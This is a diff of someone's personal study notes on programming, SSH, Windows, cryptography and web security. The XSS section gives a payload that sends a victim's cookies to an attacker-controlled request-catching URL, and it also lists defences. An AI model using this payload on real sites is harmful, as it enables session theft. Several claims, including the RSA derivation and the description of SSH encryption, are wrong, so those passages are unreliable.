+  * Unlike traditional HTTP, which is stateless and requires repeated requests (polling), WebSockets maintain an open connection.
+  * Polling is a technique that **repeatedly requests data** from a server at **regular intervals until** a desired response is received or a timeout period elapses.
+  * RFC 6455 states that WebSocket "is designed to work over HTTP ports 443 and 80 as well as to support HTTP proxies and intermediaries". 
+  * Obviously, to communicate, Websocket uses sockets ! 
 
 ## Web
 
@@ -1049,11 +1151,30 @@ body
 
 ### Django
 
-Replace this section by "Backend" ?
+- Uninstalled migrations -> python -m django manage.py migrate
+- ```You have 21 unapplied migration(s). Your project may not work properly until you apply the migrations for app(s): admin, auth, contenttypes, sessions, wordcounter.     Run 'python manage.py migrate' to apply them.```
 
-Uninstalled migrations -> python -m django manage.py migrate
+### PHP
 
-```You have 21 unapplied migration(s). Your project may not work properly until you apply the migrations for app(s): admin, auth, contenttypes, sessions, wordcounter.     Run 'python manage.py migrate' to apply them.```
+- PHP used to stand for Personal Home Page, but now the official meaning is "PHP : Hypertext Processor"
+- It's a widely-used open source general-purpose scripting language, it's especially oriented for web development. 
+- It can be embedded into HTML :
+```html
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Example</title>
+    </head>
+    <body>
+
+        <?php
+            echo "Hi, I'm a PHP script!";
+        ?>
+
+    </body>
+</html>
+```
+- PHP is "server-side", which means that the code is executed on the server. As opposed to client-side JavaScript, HTML is generated (on the server) and _then_ sent to the client. The client receives the results of running that script, but it only recieves HTML. In particular, they do not know what the underlying code was. A web server can even be configured to process all HTML files with PHP, and then there's no way that users can tell that PHP is being used.
 
 ### Further reading and tools
 
@@ -1147,16 +1268,16 @@ Apparently, a lot of people say that when HedgeHoc 2.0 will come out, it'll be a
 ### Go basics 
 
 - Go is a compiled language. 
-  * ``go build file.go`` to compile a go file. Then, run the executable (``./file``)
-  * ``go run file.go`` performs the same operation, but stores the excutable somewhere, runs it, and then deletes it. It's very useful for one-shots.
+  * `go build file.go` to compile a go file. Then, run the executable (`./file`)
+  * `go run file.go` performs the same operation, but stores the excutable somewhere, runs it, and then deletes it. It's very useful for one-shots.
 - The first line of a file indicates the package the file is in.
   * Every Go program is organized in a package. 
   A package is a collection of source files in the same directory that allows variables, types, and functions to be visible among other source files within the same package. 
   * For standalone files, the package is called main, but the name of the file is decided by the programmer.
-  * The ``fmt`` package that implements formatted I/O.
-  * All go files start with ``package [packagename]``. When importing, one imports ``path/to/package``. _Bref_, the packagename is the last element of the import path. For instance, the "math/rand" package comprises files that begin with the statement ``package rand``.
+  * The `fmt` package that implements formatted I/O.
+  * All go files start with `package [packagename]`. When importing, one imports `path/to/package`. _Bref_, the packagename is the last element of the import path. For instance, the "math/rand" package comprises files that begin with the statement `package rand`.
 - Package importation :
-  * ``import package`` or `import path/to/package`
+  * `import package` or `import path/to/package`
 - Variables must be declared before being assigned.
   * Either declared and assigned in one go :
     + `var f = 5`
@@ -1164,49 +1285,49 @@ Apparently, a lot of people say that when HedgeHoc 2.0 will come out, it'll be a
     + `var j, k = false, 5`
     + `var l, m bool = false, true`
   * Or, declared, and then assigned (they can be declared outside functions and assigned in a function)
-```go 
-  var (
-    b bool
-    c float32
-    d string
-  )
+  * ```go a
+    var (
+      b bool
+      c float32
+      d string
+    )
   
-  b, c = true, 32.0
-```
+    b, c = true, 32.0
+    ```
   * Or declared and assigned in one go using the `:=`constructor :
     + `e := 5`
     + `h, i := true, "indeed"`
   * Note that **outside a function, every statement begins with a keyword** (var, func, and so on) and so the := construct is not available.
 - When a variable is declared it is assigned the natural "null" value of the corresponding type. 
-  * For example, ``var k int`` assigns k to the value ``0``
-  * ``var s string`` assigns s to the value ``""``.
+  * For example, `var k int` assigns k to the value `0`
+  * `var s string` assigns s to the value `""`.
 - Declaring and assigning values :
-  * ``var x = 5``
+  * `var x = 5`
 - Go handles a short variable declaration, without keyword : 
   * `k := 3`
   * Note that **outside a function, every statement must begin with a keyword** (var, func, ...). The `:=` construct is hence not available.
 - Available types include :
-  * ``uint8``
-  * ``uint16``
-  * ``uint32``
-  * ``uint64``
-  * ``int``
-  * ``int8``
-  * ``int16``
-  * ``int32``
-  * ``int64``
-  * ``float32``
-  * ``float64``
-  * ``complex64``
-  * ``complex128``
-  * ``bool``
-  * ``string`` (UTF-8)
-- ``int`` is ``int32`` on 32-bits systems, and ``int64`` on 64-bits systems. 
-- The Go documentation says to use `int` unless you have a specific reason to use a fixed-size ``intXX`` type. 
+  * `uint8`
+  * `uint16`
+  * `uint32`
+  * `uint64`
+  * `int`
+  * `int8`
+  * `int16`
+  * `int32`
+  * `int64`
+  * `float32`
+  * `float64`
+  * `complex64`
+  * `complex128`
+  * `bool`
+  * `string` (UTF-8)
+- `int` is `int32` on 32-bits systems, and `int64` on 64-bits systems. 
+- The Go documentation says to use `int` unless you have a specific reason to use a fixed-size `intXX` type. 
 - Aliases :
-  * ``byte`` is an alias for ``uint8``
-  * ``rune`` is an alias for ``int32``
-  * ``int`` is an alias for ``int32`` on 32-bits systems, and ``int64`` on 64-bits systems. 
+  * `byte` is an alias for `uint8`
+  * `rune` is an alias for `int32`
+  * `int` is an alias for `int32` on 32-bits systems, and `int64` on 64-bits systems. 
 - Not unsigned (i.e., signed) int types use two's complement. 
   * In particular, on 64-bits systems, 
   * Note that the bitwise left-shift (`<<`) operator doesn't let you shift until you reach the right-most bit that's supposed to represent the sign. 
@@ -1214,17 +1335,17 @@ Apparently, a lot of people say that when HedgeHoc 2.0 will come out, it'll be a
   * This is likely for security reasons (doesn't let you do something that would yield something you didn't expect).
 - The Go compiler isn't happy when you declare variables that aren't used...
 - But it will let you declare functions without using them.
-- ``fmt.Printf()`` allows to print formatted text to standard output, just like ``printf`` in C.
-  * It uses _verbs_ : ``fmt.Print("The value of x is : %d",x)``
+- `fmt.Printf()` allows to print formatted text to standard output, just like `printf` in C.
+  * It uses _verbs_ : `fmt.Print("The value of x is : %d",x)`
   * Go _verbs_ include :
-    + ``%v`` : The value in a default format
-    + ``%+v`` : Same as ``%v``, but adds field names when printing structs
-    + ``%#v`` :	a Go-syntax representation of the value
+    + `%v` : The value in a default format
+    + `%+v` : Same as `%v`, but adds field names when printing structs
+    + `%#v` :	a Go-syntax representation of the value
   (floating-point infinities and NaNs print as ±Inf and NaN)
     + `%T`: a Go-syntax representation of the type of the value : `int`, `float64`...
     + `%%` : The way to write a percent `%` sign (without it being interpreted as a verb attempt)
     + See more in our breakdown of the [fmt](#fmt) package.
-- ``fmt.Println()`` allows to print stuff without bothering with ``%T``, ``%d``...
+- `fmt.Println()` allows to print stuff without bothering with `%T`, `%d`...
 ```go
 package main
 
@@ -1256,7 +1377,7 @@ func main() {
 ```
 - **Exported names** : As said before, variables, types, and functions declared in a file associated to a package `package` are visible among other source files within the same package. This is actually only partially true : it is only true for **exported names**. Exported names are the names that start with a capital letter. Exported names will be seen from other source files in the same package. For instance, `import "math"` allows to write `math.Pi` to display the value of $\pi$, but `math.pi`won't work.
 - Functions are declared like so :
-  * ```go
+  * ``go
     func add(x int, y int) int {
       return x + y
     }
@@ -1331,11 +1452,11 @@ func main() {
   * You cannot `Println` them beccause that requires to convert the `const` to have a type.
   * You can cast them as `float64`s because... idk why, but it works. It will yield a float of the type `1.2676506002282295e+29`.
 - For statements : 
-    * ```go
-      for n := 0; n <= 10; n++ {
-          fmt.Println(sum_of_squares(n))
-        }
-      ```
+  * ```go
+    for n := 0; n <= 10; n++ {
+        fmt.Println(sum_of_squares(n))
+      }
+    ```
   * The first and last statements are optional !
   * ```go
     sum := 1
@@ -1557,35 +1678,36 @@ source .venv/bin/activate
 
 pip install ..., pip install ..., ...
 ```
+Use `deactivate` to exit the venv
 
 ## Windows
 
 ### Windows Powershell
 
 - Variables d'environnement
-  * Pour afficher une variable d'environnement, par exemple (au hasard) PATH : ``echo $env:path``
-  * Pour toutes les afficher : ``gci env:``, ou ``ls env:`` (``gci`` est l'alias de ``Get-ChildItem``, comme ``ls``)
-- ``systeminfo`` sur Windows pour avoir des informations sur le système
-- Infinite loop in PowerShell : ``while ($true) { DoStuff } ``
-- Infinite loop in ``cmd`` (or batch script) : ``for /l %n in (1,0,10) do (DoStuff)`` for instance (for loop, from 1, to 0, with increment 10)(lol)
+  * Pour afficher une variable d'environnement, par exemple (au hasard) PATH : `echo $env:path`
+  * Pour toutes les afficher : `gci env:`, ou `ls env:` (`gci` est l'alias de `Get-ChildItem`, comme `ls`)
+- `systeminfo` sur Windows pour avoir des informations sur le système
+- Infinite loop in PowerShell : `while ($true) { DoStuff } `
+- Infinite loop in `cmd` (or batch script) : `for /l %n in (1,0,10) do (DoStuff)` for instance (for loop, from 1, to 0, with increment 10)(lol)
 - Shutting down :
-  * ``shutdown | shutdown /?``  to show help
-  * ``shutdown /t 0`` to shutdown now
-  * ``shutdown /r`` to reboot
-  * ``shutdown /r /t 0`` to reboot now
-  * ``shutdown /a`` to cancel planned shutdown
+  * `shutdown | shutdown /?`  to show help
+  * `shutdown /t 0` to shutdown now
+  * `shutdown /r` to reboot
+  * `shutdown /r /t 0` to reboot now
+  * `shutdown /a` to cancel planned shutdown
 
 ### WSL
 
 - To activate (or [install](https://learn.microsoft.com/en-gb/windows/wsl/install)) [WSL](https://learn.microsoft.com/en-us/windows/wsl/setup/environment) : 
-  * ``wsl --install`` in a Powershell.
+  * `wsl --install` in a Powershell.
   * Reboot. If a text apprears, it means that WSL is already active (go to next step)
-  * ``wsl --list --online``, or ``wsl -l -o.`` : display list of available distributions
-  * ``wsl --install -d Ubuntu`` or ``wsl --install -d Debian`` for instance to install a specific distribution.
-  Note : If ``wsl --install`` displays a help message, specify the distribution (according to what has just been said)
+  * `wsl --list --online`, or `wsl -l -o.` : display list of available distributions
+  * `wsl --install -d Ubuntu` or `wsl --install -d Debian` for instance to install a specific distribution.
+  Note : If `wsl --install` displays a help message, specify the distribution (according to what has just been said)
   * In case of errors :
-    - ``wsl --set-default-version 2`` sets up WSL's default version to WSL _2_, which can get it to work
-    - ``wsl.exe --update`` updates WSL
+    - `wsl --set-default-version 2` sets up WSL's default version to WSL _2_, which can get it to work
+    - `wsl.exe --update` updates WSL
     - [Install manual](https://learn.microsoft.com/en-gb/windows/wsl/install-manual)
 - WSL is very cool, _except_ for computer notworking. Use (actual) Linux.
 - On windows, by default, the WSL executable is stored in `C:\Program Files\WSL\wsl.exe`. 
@@ -1608,8 +1730,8 @@ pip install ..., pip install ..., ...
 
 ### Windows miscellaneous information
 
-- Open the Run Command dialog (``WIN+R``) and type ``shell:AppsFolder``to get a pretty exhaustive list of installed apps/softwares on the OS. Very useful for setting up a shortcut to open them (WhatsApp for instance) ! Create a shortcut, ``sh.lnk`` for instance, place it somewhere accessible from the PATH environment variable (``~`` for instance) and typing ``sh`` in the Run Command dialog (``WIN+R``) will open it !
-- Paint is opened with the ``mspaint.exe`` executable file located in `` C:\WINDOWS\system32``, which is in the PATH environment variable : ``WIN+R`` and ``mspaint`` opens it.
+- Open the Run Command dialog (`WIN+R`) and type `shell:AppsFolder`to get a pretty exhaustive list of installed apps/softwares on the OS. Very useful for setting up a shortcut to open them (WhatsApp for instance) ! Create a shortcut, `sh.lnk` for instance, place it somewhere accessible from the PATH environment variable (`~` for instance) and typing `sh` in the Run Command dialog (`WIN+R`) will open it !
+- Paint is opened with the `mspaint.exe` executable file located in ` C:\WINDOWS\system32`, which is in the PATH environment variable : `WIN+R` and `mspaint` opens it.
 - If, especially when trying to backup, some folders like Pictures, Videos, Documents... don't appear in the `~`, they may be in `~/OneDrive` (i.e., OneDrive has been configured on this hard drive)! (cf. Adventures with Paola and her hard drive)
 
 ## SSH
@@ -1632,34 +1754,47 @@ pip install ..., pip install ..., ...
 - This way, SSH ensures **authenticity** of encrypted data. 
 - Confidentiality and Integrity are implemented simultaneously, and (simultaneously) also ensured by SSH.
 - SSH uses TCP port 22.
-- If (on WSL for instance) ssh tells you that it doesn't have the permissions ti use the key (or thinks you're not the real owner), use ``chmod 600 ~/.ssh/privatekay`` (and ``chmod 600 ~/.ssh/publickey``, tant qu'on y est) to open the permissions.
-- SSH uses an _SSH Agent_ to find the keys 
+- If (on WSL for instance) ssh tells you that it doesn't have the permissions to use the key (or thinks you're not the real owner), use `chmod 600 ~/.ssh/privatekay` (and `chmod 600 ~/.ssh/publickey`, tant qu'on y est) to open the permissions.
+- We call **ssh client**, or **ssh client program**, the program that runs on your machine and manages ssh.
+- For instance, OpenSSH is a ssh client (an implementation of SSH). PuTTY is another one (but, lol.).
+- SSH uses a program called `ssh-agent`.
+  * SSH client programs (`ssh` from OpenSSH. Or PuTTY, lol) typically run for the duration of a remote login session. 
+  * They and are configured to look for the user's private key in a file in the user's home directory (~/.ssh/...).
+  * For more security, the private key is stored in an encrypted form, and the key's password is used to compute decypher the private key.
+  * So, to sum it up, the private key that's stored on disk is not the actual private key, it's an encrypted version of it, and the key's password is necessary to retrieve the decrypted key.
+  * The problem with that is that, without anything else, the user would have to type it's key password each time a packet is sent.
+  * That would be annoying. A solution could be to store the unencrypted key in memory, in a space associated to the space to the ssh client process.
+  * This would imply that the key would've to be typed each time it's needed.
+  * People weren't happy with that, they wanted it to last for longer, and not have to type it all the time. 
+  * So, they needed a separate process to manage this. `ssh-agent` is such program. 
+  * `ssh-agent` communicates with the SSH Client to provide the unencrypted key each time its needed.
+  * For this, the client uses Unix domain socket, i.e., a (Berkeley) socket that allows data to be exchanged between two processes executing on the same (Unix or Unix-like) host computer.
 
 ### SSH usage
 
-- ``ssh -i "~/.ssh/privatekey_filename" user@[IPv4 or IPv6 address, or domain name]``
-- ``ssh -i "~/.ssh/privatekey" user@hostname -J -i "~/.ssh/privatekey" user@ssh-bridge``
+- `ssh -i "~/.ssh/privatekey_filename" user@[IPv4 or IPv6 address, or domain name]`
+- `ssh -i "~/.ssh/privatekey" user@hostname -J -i "~/.ssh/privatekey" user@ssh-bridge`
 ( u)
 - Note : if something doesn't work, check that you have specified a private key (and that it's the right one)
 - When using an SSH bridge, both what is sent by you to the ssh bridge _and_ what is sent by the ssh bridge to the desired distant host are encrypted with your private key. Actually, the private keys can be configured to be different (just set different keys in the command), but the ssh bridge will not use any key located on their storage. You must specify (and give) both keys.
 - The **authorized_keys** file : 
-  * It is located in ``~/.ssh/``, on the appropriate user (there is one per user, it will correspond to the user you connect to when you use ``user@host``)
+  * It is located in `~/.ssh/`, on the appropriate user (there is one per user, it will correspond to the user you connect to when you use `user@host`)
   * It lists all public keys that are allowed to connect to the server (to the host (machine) and user concerned).
   * You typically have to contact the server administrator for him to add your public key in this file for you to be able to connect.
 - The **known_host** file : 
-  * It is located in ``~/.ssh/``, but (typically) on _your_ machine.
+  * It is located in `~/.ssh/`, but (typically) on _your_ machine.
   * It lists _public-key_-_ip address_ pairs, to avoid man-in-the-middle attacks (in the form of hashs computed using the SHA256 (or another) hash map)
   * When a machine connects to an IP address for the first time, the terminal (OpenSSH) tells something like : "Are you sure you want to connect to this host ? Here is (a hash of) the remote host's public key". The idea is that you should then contact the server administrator to make sure this fingerprint is actually the one of the server you want to connect to : to avoid a man-in-the-middle attack, i.e. to avoid connecting to the wrong remote host. 
   * In practice, no one does that. We just type "yes". 
-  * The _public-key_-_ip address_ pair (a hash of it, actually) is then stored in the ``known_host`` file. (It adds one line to the file, the fact that they are paired is made by the fact that they are on the same line). 
+  * The _public-key_-_ip address_ pair (a hash of it, actually) is then stored in the `known_host` file. (It adds one line to the file, the fact that they are paired is made by the fact that they are on the same line). 
   * Your machine then knows that this remote host is trustworthy and it won't ask this a second time.
 
 ### SSH Config files
 
 - An SSH config allow to win time by pre-configuring some SSH parameter to connect to distant servers quicker without having to write the same command over and over again.
 - An SSH config must be written in a (text) file, either :
-  * named ``config`` and located in ``~/.ssh/``
-  * or named ``ssh_config`` and located in ``/etc/ssh/ssh_config`` (on Linux)
+  * named `config` and located in `~/.ssh/`
+  * or named `ssh_config` and located in `/etc/ssh/ssh_config` (on Linux)
 - Example :
 ```
 Host ssh.enst.fr
@@ -1685,18 +1820,18 @@ Host pace
   IdentityFile ~/.ssh/ed
 ```
 - Uppercase first letters are mandatory.
-- ``Hostname``, ``User``, ``IdentityFile`` are self-explanatory...
-- ``ProxyCommand`` specifies the command to use to connect to the server. (...)
+- `Hostname`, `User`, `IdentityFile` are self-explanatory...
+- `ProxyCommand` specifies the command to use to connect to the server. (...)
   * The command string extends to the end of the line, and is executed using the user's shell ‘exec’ directive to avoid a lingering shell process. (...)
-  * ``ProxyCommand ssh -W %h:%p ssh.enst.fr`` can be used to automate the connection to a SSH bridge. (What does -W do though ?)(...)
+  * `ProxyCommand ssh -W %h:%p ssh.enst.fr` can be used to automate the connection to a SSH bridge. (What does -W do though ?)(...)
 - ProxyJump too, but easier. 
-  * ``ProxyJump user@host:port``
-- ``ProxyCommand`` and ``ProxyJump`` accept [TOKENS](https://man.openbsd.org/ssh_config#TOKENS) :
-  * ``%h`` : will be replaced by the Host
-  * ``%n`` : will be replaced by the original remote hostname, as given on the command line.
-  * ``%p`` : will be replaced by the remote Port.
-  * ``%r`` : will be replaced by the remote Username.
-  * ``%%`` : will be replaced by ``%``
+  * `ProxyJump user@host:port`
+- `ProxyCommand` and `ProxyJump` accept [TOKENS](https://man.openbsd.org/ssh_config#TOKENS) :
+  * `%h` : will be replaced by the Host
+  * `%n` : will be replaced by the original remote hostname, as given on the command line.
+  * `%p` : will be replaced by the remote Port.
+  * `%r` : will be replaced by the remote Username.
+  * `%%` : will be replaced by `%`
   * ProxyCommand and ProxyJump do not accept any other [TOKENS  described by the Documentation](https://man.openbsd.org/ssh_config#TOKENS)
   * There exists other tokens.
 - **Documentation** : 
@@ -1706,36 +1841,36 @@ Host pace
 ### SCP
 
 - Usage : 
-  * ``scp -i "path/to/key" user@[IP Address]`` (Brackets are optional)
-  * ``scp -i "path/to/key" [filename | path/to/filename] user@[IP Address]:desired/path/to/file`` (First brackets are unnecessary (maybe even command-breaking), second brackets are mandatory)(Also, it is possible to change the filename in the process : ``desired/path/to/newfilename.fileextension``. In other words, ``file`` can be different from the original filename (the new file created will then have this name). Specifying no file name (that is, ``desired/path/to/file/``, with the path **ending in a ``/``**) will keep the file name)
-  * **To copy (whole) directories** : ``scp (-i ...) -r foolder/* root@pace-lxc.rezel.net:~/``. The ``*`` wildcard is optional.
+  * `scp -i "path/to/key" user@[IP Address]` (Brackets are optional)
+  * `scp -i "path/to/key" [filename | path/to/filename] user@[IP Address]:desired/path/to/file` (First brackets are unnecessary (maybe even command-breaking), second brackets are mandatory)(Also, it is possible to change the filename in the process : `desired/path/to/newfilename.fileextension`. In other words, `file` can be different from the original filename (the new file created will then have this name). Specifying no file name (that is, `desired/path/to/file/`, with the path **ending in a `/`**) will keep the file name)
+  * **To copy (whole) directories** : `scp (-i ...) -r foolder/* root@pace-lxc.rezel.net:~/`. The `*` wildcard is optional.
 - SHA256 (et SHA512, SHA1, ...) sont des fonctions de hashage.
-- **authorized_keys** : C'est le fichier, situé dans ``~/.ssh/`` d'un serveur, qui dit les clés publiques qui sont autorisées à se connecter à un certain user. 
-  * Un client peut se connecter à un serveur en SSH au user ``utilisateur`` si (et seulement si) sa clé publique se situe dans le ``authorized_keys`` de l'utilisateur, autrement dit dans le fichier ``/home/utilisateur/.ssh/authorized_keys``. 
+- **authorized_keys** : C'est le fichier, situé dans `~/.ssh/` d'un serveur, qui dit les clés publiques qui sont autorisées à se connecter à un certain user. 
+  * Un client peut se connecter à un serveur en SSH au user `utilisateur` si (et seulement si) sa clé publique se situe dans le `authorized_keys` de l'utilisateur, autrement dit dans le fichier `/home/utilisateur/.ssh/authorized_keys`. 
 
 ## Cybersecurity
 
 ### Metadatas
 
-- ``meta2go``, ``exiftool``, ``aperisolve``, ... Are tools that are able to extract metadatas.
-- ``www.dcode.fr`` propose un détecteur de code, qui tente de trouver le code qui a choffré un truc. 
+- `meta2go`, `exiftool`, `aperisolve`, ... Are tools that are able to extract metadatas.
+- `www.dcode.fr` propose un détecteur de code, qui tente de trouver le code qui a choffré un truc. 
 
 ### Cross-site scripting (XSS)
 
 - XSS Means cross-site scripting. Yes, the acronym does not work...
 - The goal of a XSS breach is to get the cookies of an administrator of a web page. This is done by getting a cookie, which acts like an access token.
-- Example : When typing "Foobar" in a the Google seach engine, the word "Foobar" appears in the web page source code. More generally : if there is an input on the page that reads text, and if it turns out that this code gets written directly on the HTML, you can inject stuff on the HTML... JavaScript ``<script></script>`` tags for instance, that can run code !
+- Example : When typing "Foobar" in a the Google seach engine, the word "Foobar" appears in the web page source code. More generally : if there is an input on the page that reads text, and if it turns out that this code gets written directly on the HTML, you can inject stuff on the HTML... JavaScript `<script></script>` tags for instance, that can run code !
 - Context is the crucial point : The text could be inserted as raw HTML code, inside HTML tags attribute, or inside JavaScript code.
 - To detect XSS : List all user inputs, and try to see them being reused (reflected, written directly) on the page 
 - To exploit an XSS breach : 
-  * You would, typically, insert the following JavaScript Code : ``document.location.replace(CONTROLLED_URL+document.cookie)``
-  * This code will, when executed in a browser, replace the cuurent URL the browser is into by the URL ``CONTROLLED_URL+document.cookie``.
-  * Here, ``CONTROLLED_URL`` is an URL you control, i.e. that you can choose.
-  * Typically, you would use a website like ``Pipedream`` or **``Requestcatcher``** (Requestcatcher is better) that gives you an URL (which you (partially) choose, like ``hiimsteve.requestcatcher.com`` and prints you the requests that are sent to that URL. 
-  * Adding ``document.cookie`` adds the cookies of the person that get trapped in the XSS breach !
+  * You would, typically, insert the following JavaScript Code : `document.location.replace(CONTROLLED_URL+document.cookie)`
+  * This code will, when executed in a browser, replace the cuurent URL the browser is into by the URL `CONTROLLED_URL+document.cookie`.
+  * Here, `CONTROLLED_URL` is an URL you control, i.e. that you can choose.
+  * Typically, you would use a website like `Pipedream` or **`Requestcatcher`** (Requestcatcher is better) that gives you an URL (which you (partially) choose, like `hiimsteve.requestcatcher.com` and prints you the requests that are sent to that URL. 
+  * Adding `document.cookie` adds the cookies of the person that get trapped in the XSS breach !
 - Reflected XSS
   * In this case, the malicious code is executed locally on the admin's machine.
-  * The attacker sends to the admin a webpage with a malicous payload. Typically, what we mean by payload is URL of the form ``www.website.com/.../[URL encoded payload]`` : that is, adding a payload means adding something to the URL. 
+  * The attacker sends to the admin a webpage with a malicous payload. Typically, what we mean by payload is URL of the form `www.website.com/.../[URL encoded payload]` : that is, adding a payload means adding something to the URL. 
   * The admin must then click on the link. This is basically fishing : the admin must click on the link...
   * The admin will then visit (his own !) web page, connected with his account. His (own !) server will respond ot him (with his admin cookie).
   * The malicious payload will then be executed (on his own machine), and will send his cookie to the attacker.
@@ -1752,12 +1887,12 @@ Host pace
   * Searching a little bit often gets you what you need
 - Protection against XSS
   * The most powerful one : Encoding data
-  * That is, replacing ``<`` by ``&lt;`` and ``>`` by ``&gt;``. This works well because data ecryption in HTML was done precisely to prevent XSS vulnerabilities.
-  * Filtering data : If a user writes ``<script>`` in a text form... He is likely fouting himself of your gueule : prevent them from writing stuff like this in text boxes
+  * That is, replacing `<` by `&lt;` and `>` by `&gt;`. This works well because data ecryption in HTML was done precisely to prevent XSS vulnerabilities.
+  * Filtering data : If a user writes `<script>` in a text form... He is likely fouting himself of your gueule : prevent them from writing stuff like this in text boxes
   * Validation : A text box that is supposed to recieve a phone number should stop anyone from writing anything else than digits for instance ;
   * CSP : complicated, we'll see that later
-- To put payload into URLs, you must use URL encoding : ``urlencoder.org``. This can also be used for URL decoding. More generally, to inject text into URLs, you must encode things into the right "URL format". Otherwise things dont work. 
-- The ``eval()`` function in JavaScript is very dangerous in terms of security. Avoid it (voire : banish it).
+- To put payload into URLs, you must use URL encoding : `urlencoder.org`. This can also be used for URL decoding. More generally, to inject text into URLs, you must encode things into the right "URL format". Otherwise things dont work. 
+- The `eval()` function in JavaScript is very dangerous in terms of security. Avoid it (voire : banish it).
 
 ### Cryptography
 
@@ -1770,6 +1905,14 @@ Cryptography is about protecting and piercing secrets. Cryptography algorithms u
   * Both people don’t share the same secret (they have different keys)
   * It is more secure, but slower. 
   * Most commonly used schemes are broken by quantum-computers
+- In both cases, base principles of cryptography include : 
+  * The fact that the "secret" should never be the cyphering method itself.
+  * I.e, the security should never rely on the fact that people _do not know_ what the cyphering method is.
+  * I.e., and this is what's done in all real use-cases, the cyphering method should not be secret :
+  * The secret is then something else, typically such as a (secret) key that only the users know, that's impossible to guess, reverse-engineer, and bruteforce.
+  * It is clearly way too dangerous to rely on a "secret" cyphering method : there could be attacks : for instance, Caesar's encryption is easily breakable using statistical methods. 
+  * An attacker could try several options and there would be a risk.
+  * Unless there'd exist at least $10^20$ encryption methods to choose from, having a un-bruteforce-able key is much better.
 
 #### Symmetric cryptography
 
@@ -1794,14 +1937,53 @@ It works with a function : $ s : (\mathrm{key},\mathrm{message}) \to s(\mathrm{k
 - **Modes ?**
 - AES : https://cryptohack.org/challenges/aes/-
 
+#### Asymmetric cryptography 
+
+- Asymmetric cryptography is a cryptography paradigm in which each communicant has a public and a private key.
+  * Data is encrypted using the recipient's public key.
+  * This way, only him can decypher it !
+  * (Assuming that the privacy of the private key is ensured).
+- Diffie-Hellman is an assymetric cryptography algorithm (exchange protocol)
+  * The goal of this protocol is to use an assymetric protocol for generating a common symmetric key. 
+  * i.e., we assume that Alice and Bob both have (private key, public key) pairs, 
+  * and that they want a way to generate a _common secret_ key to start a communication 
+  * based on symmetric cryptography.
+  * Let $n \geqslant 2$ and $g$ be a generator of $ \mathbb Z / n \mathbb Z $. 
+  * Alice has a private key $a$ and Bob has a private key $b$.
+  * Alice sends $A = g^a [N]$. Bob sends $B = g^b [N]$.
+  * Alice computes $K_a = B^a [N]$, Bob computes $K_b = A^b [N]$...
+  * ... and we then have $ K_a = K_b =: K $ ! 
+  * Indeed (this is an easy exercise) : , $ K_a = B^a = g^{ab} = A^b = K_b [N] $
+  * They can then use this key to communicate securely.
+  * The uncrackability of this protocol relies on the "fact" that the discrete logarithm is hard to compute.
+  * If it is, the protocol is very secure. If it's not, it's not. 
+  * As always, it has been uncracked for decades, so...
+- RSA is the most commonly used cryptography algorithm. It is quite standard. It is used in SSH by default.
+  * RSA key generation : 
+    + Choose two (very, very large) primes $p$ and $q$
+    + Let $n = pq$
+    + Thus, $\varphi(n) = (p-1)(q-1)$ where $\varphi$ is Euler' Totient function. 
+    + Choose $e$ coprime with $\varphi(n)$
+    + Find $d = e^{-1} [\varphi(n)]$ (using Euclid's algorithm)
+    + The public key is then $(n,e)$
+    + The private key is then $d$.
+  * RSA encryption 
+    + If Alice wants to send an encrypted message $m$ to Bob.
+    + She computes, using Bob's public $(n,e)$ key, $c = m^e [n]$
+    + Bob recieves $m^e [n]$ and knows his private key $d = e^{-1} [\varphi(n)]$ 
+    + By Euler's theorem, $m^{ed} = m [\varphi(n)]$. This way he can get $m [N]$ !
+    + N is called (public) modulus or cryptographic modulus
+    + e is called encryption exponent (public exponent)
+    + d is called decryption exponent (private exponent)
+
 ### Reverse
 
 If you have the code source of a compiled binary file, it is easy to understand what the code is used to. 
 
 Reminder : Compilation chain
-- Compiler (gcc, g++) : ``.c``, ``.cpp``, ``.h`` -> ``.s``
-- Assembler (as) : ``.s`` -> ``.o``
-- Linker (ld) ``.o`` -> ``.exe``
+- Compiler (gcc, g++) : `.c`, `.cpp`, `.h` -> `.s`
+- Assembler (as) : `.s` -> `.o`
+- Linker (ld) `.o` -> `.exe`
 - CISC Architectires : (x86/Intel, AMD)
 - RISC Architectures : (ARM, MIPS, RISC-V)
 To train reversing : Crackme challenges.
@@ -1809,8 +1991,8 @@ It is easier on Linux to have these : VirtualBox
 - Static approach : using a decompiler (Ghidra,Cutter) to reverse machine code into [source code](...)
 - Dynamic : Run the binary with debugger ([gdb](https://www.sourceware.org/gdb/), GNU Project Debugger) to inspect memory, registers and the execusion of the code
 - Always start with a static approach
-  * Use ``file`` on an executable file to get th
-  * Use ``strings`` to display all strings located in the executable file. If there is a password hidden it, it can be
+  * Use `file` on an executable file to get th
+  * Use `strings` to display all strings located in the executable file. If there is a password hidden it, it can be
   * Note : in reality 
   * Use Ghidra to try to (statically) un
 - If the static approach isn't enough, you can use gdb
@@ -1965,20 +2147,26 @@ The act of rebasing means taking a bunch of commits, and _re-basing_ them, i.e.,
 
 ### Git miscellaneous information
 
-- ``Your configuration specifies to merge with the ref 'refs/heads/dev-prod' from the remote, 
-``but no such ref was fetched.`` happens when you try to pull from a branch that doesn't exist. 
+- `Your configuration specifies to merge with the ref 'refs/heads/dev-prod' from the remote, 
+`but no such ref was fetched.` happens when you try to pull from a branch that doesn't exist. 
 - Git credentials : 
   * When using Github, Gitlab or Gitea : if you try to push using HTTP, it should likely ask for your Git(Hub/Lab/Tea) credentials.
-  * If you don't have any credientials (on ``git.rezel.net`` or ``gitlab.telecom-paris.fr`` for instance : connecting using SSO), you can generate acces tokens from the Settings panel. Then connect using your username (git.[...]/username/repo)
+  * If you don't have any credientials (on `git.rezel.net` or `gitlab.telecom-paris.fr` for instance : connecting using SSO), you can generate acces tokens from the Settings panel. Then connect using your username (git.[...]/username/repo)
 - When git is installed on a given machine, it must have set up a username and a email (that will correspond to the user that'll use Git in this machine). 
-  * Set up the email with ``git config --global user.email "email@domain.com"``
-  * Set up the username with ``git config --global user.name "username"``
-  * When this is set up, appear as done by you : ``Author: William Driot <william.driot@gmail.com>``
+  * Set up the email with `git config --global user.email "email@domain.com"`
+  * Set up the username with `git config --global user.name "username"`
+  * When this is set up, appear as done by you : `Author: William Driot <william.driot@gmail.com>`
   * **You can set up a username and email for a repo only**
     + This is useful for specific projects
-    + Just remove the ``--global`` flag (and execute the commands in the right repo) : ``git config user.email "email@domain.com"``, ``git config user.name "username"``
+    + Just remove the `--global` flag (and execute the commands in the right repo) : `git config user.email "email@domain.com"`, `git config user.name "username"`
 
-## Computer architecture
